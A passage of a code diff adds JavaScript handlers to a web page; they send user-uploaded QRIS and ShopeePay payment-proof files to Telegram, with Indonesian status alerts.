+      const caption = "Bukti pembayaran QRIS";
+      const sentFile = await sendTelegramFile(proofFile, caption);
+      if (!sentFile) {
+        alert("Gagal mengirim bukti pembayaran ke Telegram. Silakan coba lagi.");
+        return;
+      }
+      alert("Bukti pembayaran QRIS berhasil dikirim. Terima kasih!");
+      qrisProofForm.reset();
+      showConfirmation();
+    });
+
+    shopeePayProofForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const proofFile = shopeePayProofForm.paymentProof.files[0];
+      if (!proofFile) {
+        alert("Silakan upload bukti pembayaran.");
+        return;
+      }
+      const caption = "Bukti pembayaran Shopee Pay";
+      const sentFile = await sendTelegramFile(proofFile, caption);
+      if (!sentFile) {
+        alert("Gagal mengirim bukti pembayaran ke Telegram. Silakan coba lagi.");
+        return;
+      }
+      alert("Bukti pembayaran Shopee Pay berhasil dikirim. Terima kasih!");
+      shopeePayProofForm.reset();
+      showConfirmation();
+    });
+  </script>
+</body>
+</html>
